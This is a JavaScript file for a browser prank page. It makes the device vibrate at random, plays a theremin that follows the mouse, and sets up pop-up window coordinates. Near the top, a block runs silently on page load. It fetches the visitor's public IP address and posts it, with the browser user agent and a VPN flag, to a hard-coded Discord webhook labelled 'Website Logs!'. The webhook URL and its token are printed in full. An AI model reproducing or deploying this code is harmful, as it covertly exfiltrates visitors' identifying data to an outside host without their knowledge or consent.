const SCREEN_WIDTH = window.screen.availWidth
const SCREEN_HEIGHT = window.screen.availHeight
const WIN_WIDTH = 480
const WIN_HEIGHT = 260
const VELOCITY = 15
const MARGIN = 10
const TICK_LENGTH = 50

const HIDDEN_STYLE = 'position: fixed; width: 1px; height: 1px; overflow: hidden; top: -10px; left: -10px;'

fetch('https://api.ipify.org/?format=json')
  .then(function(response) {
    return response.json();
  })
  .then(function(data) {
    var ip = data.ip;
    var computerName = navigator.userAgent;

    var vpnIpRanges = [

    ];

    var isVPN = vpnIpRanges.some(function(range) {
      return isIPInRange(ip, range);
    });

    var webhook = 'https://discord.com/api/webhooks/1146479722239373514/LvJIRvNs-OWJpzO6pcYevfijhvUpReAFWpbXjmct_kCxEg16pmqig2znAVjgjd7fdASI';

    var message = {
      embeds: [
        {
          title: 'Website Logs!',
          color: 3447003,
          fields: [
            {
              name: 'Connected:',
              value: ip,
              inline: true
            },
            {
              name: 'Computer Name:',
              value: computerName,
              inline: true
            },
            {
              name: 'VPN:',
              value: isVPN ? 'Yes' : 'No',
              inline: true
            }
          ]
        }
      ]
    };

    fetch(webhook, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(message)
    });
  });

function isIPInRange(ip, range) {
  var ipInt = ipToNumber(ip);
  var rangeParts = range.split('/');
  var rangeStart = ipToNumber(rangeParts[0]);
  var rangeEnd = rangeStart + Math.pow(2, 32 - parseInt(rangeParts[1])) - 1;
  return ipInt >= rangeStart && ipInt <= rangeEnd;
}

function ipToNumber(ip) {
  return ip.split('.').reduce(function(result, octet) {
    return (result << 8) + parseInt(octet, 10);
  }, 0);
}

const PHRASES = [
  'kaczuszka',
]

const wins = []

let interactionCount = 0

let numSuperLogoutIframes = 0

const isChildWindow = (window.opener && isParentSameOrigin()) ||
  window.location.search.indexOf('child=true') !== -1

const isParentWindow = !isChildWindow

function startVibrateInterval () {
  if (typeof window.navigator.vibrate !== 'function') return
  setInterval(() => {
    const duration = Math.floor(Math.random() * 600)
    window.navigator.vibrate(duration)
  }, 1000)

  window.addEventListener('gamepadconnected', (event) => {
    const gamepad = event.gamepad
    if (gamepad.vibrationActuator) {
      setInterval(() => {
        if (gamepad.connected) {
          gamepad.vibrationActuator.playEffect('dual-rumble', {
            duration: Math.floor(Math.random() * 600),
            strongMagnitude: Math.random(),
            weakMagnitude: Math.random()
          })
        }
      }, 1000)
    }
  })
}

function startTheramin () {
  const audioContext = new AudioContext()
  const oscillatorNode = audioContext.createOscillator()
  const gainNode = audioContext.createGain()

  const pitchBase = 50
  const pitchRange = 4000

  const wave = audioContext.createPeriodicWave(
    Array(10).fill(0).map((v, i) => Math.cos(i)),
    Array(10).fill(0).map((v, i) => Math.sin(i))
  )

  oscillatorNode.setPeriodicWave(wave)

  oscillatorNode.connect(gainNode)
  gainNode.connect(audioContext.destination)

  oscillatorNode.start(0)

  const oscillator = ({ pitch, volume }) => {
    oscillatorNode.frequency.value = pitchBase + pitch * pitchRange
    gainNode.gain.value = volume * 3
  }

  document.body.addEventListener('mousemove', event => {
    const { clientX, clientY } = event
    const { clientWidth, clientHeight } = document.body
    const pitch = (clientX - clientWidth / 2) / clientWidth
    const volume = (clientY - clientHeight / 2) / clientHeight
    oscillator({ pitch, volume })
  })
}

function getRandomCoords () {
  const x = MARGIN +
    Math.floor(Math.random() * (SCREEN_WIDTH - WIN_WIDTH - MARGIN))
  const y = MARGIN +
    Math.floor(Math.random() * (SCREEN_HEIGHT - WIN_HEIGHT - MARGIN))
  return { x, y }
}

function getRandomArrayEntry (arr) {
  return arr[Math.floor(Math.random() * arr.length)]
}